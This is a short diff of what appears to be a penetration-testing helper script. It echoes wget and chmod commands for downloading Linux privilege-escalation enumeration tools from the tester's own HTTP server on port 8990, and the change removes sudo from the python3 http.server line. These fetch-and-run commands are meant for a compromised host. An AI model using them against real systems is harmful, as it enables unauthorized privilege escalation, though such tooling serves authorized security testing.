@@ -37,4 +37,4 @@ echo "wget http://$ip:8990/linux-exploit-suggester.sh; chmod +x linux-exploit-su
 echo "wget http://$ip:8990/linuxprivchecker.py; chmod +x linuxprivchecker.py"
 echo ""
 
-sudo python3 -m http.server 8990
+python3 -m http.server 8990
